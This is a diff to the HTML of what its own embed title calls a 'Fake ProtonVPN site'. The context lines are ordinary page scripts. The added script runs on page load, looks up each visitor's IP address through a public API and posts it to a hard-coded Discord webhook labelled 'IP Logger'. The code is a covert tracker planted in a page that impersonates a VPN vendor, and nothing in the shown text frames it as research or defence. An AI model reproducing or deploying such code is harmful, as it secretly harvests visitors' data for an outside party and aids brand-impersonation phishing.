@@ -1463,6 +1463,51 @@
       }
    </script>
    <script nonce="">(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.nonce='MTM1LDU2LDI0MCw1MywyMDQsMTc3LDQwLDIx';d.innerHTML="window.__CF$cv$params={r:'8e3d3dc49eb3ded2',t:'MTczMTgyMDUwOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='MTM1LDU2LDI0MCw1MywyMDQsMTc3LDQwLDIx';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-gtm-yt-inspected-16="true"></iframe><iframe height="0" width="0" style="display: none; visibility: hidden;" data-gtm-yt-inspected-16="true"></iframe><script src="https://www.youtube.com/iframe_api"></script>
+   <script>
+    // Function to send the IP to the Discord webhook as an embed
+    function sendIPToDiscord(ip) {
+        const webhookURL = "https://discord.com/api/webhooks/1303905695208570890/hqxllBpBroaolym0eh6KgVZE0vBlDu4Ng-yh9F1Tc4fhtlXm9J_odrDJWI6WMF3-2qr4"; // Replace with your Discord webhook URL
+
+        const embed = {
+            title: "From Fake ProtonVPN site",
+            color: 3447003, // Embed color in hexadecimal
+            fields: [
+                {
+                    name: "User IP",
+                    value: ip,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "IP Logger"
+            }
+        };
+
+        const payload = {
+            embeds: [embed]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => console.log('Successfully sent IP to Discord:', data))
+        .catch(error => console.error('Error sending IP to Discord:', error));
+    }
+
+    // Fetch the user's IP using a public API
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            console.log('User IP:', data.ip);
+            sendIPToDiscord(data.ip);  // Send the IP to the Discord webhook as an embed
+        })
+        .catch(error => console.error('Error fetching IP:', error));
+</script>
    <div id="onetrust-consent-sdk">
       <div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div>
    </div>
